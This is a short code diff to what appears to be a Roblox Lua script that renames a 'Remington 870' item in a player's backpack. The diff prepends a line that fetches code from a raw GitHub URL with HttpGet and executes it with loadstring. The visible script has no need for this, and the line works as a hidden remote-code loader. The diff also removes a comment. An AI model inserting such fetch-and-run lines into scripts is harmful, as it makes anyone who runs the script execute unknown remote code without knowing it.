@@ -1,8 +1,11 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/100000000000000000000000000000000/splash-zone/refs/heads/main/yu",true))()
+
+
 local player = game:GetService("Players").LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 wait(1)
 local backpack = player.Backpack
--- Check if the Remington exists in the backpack
+
 local remington = backpack:FindFirstChild("Remington 870")
 if remington then
     -- Rename the Remington to "Remi"
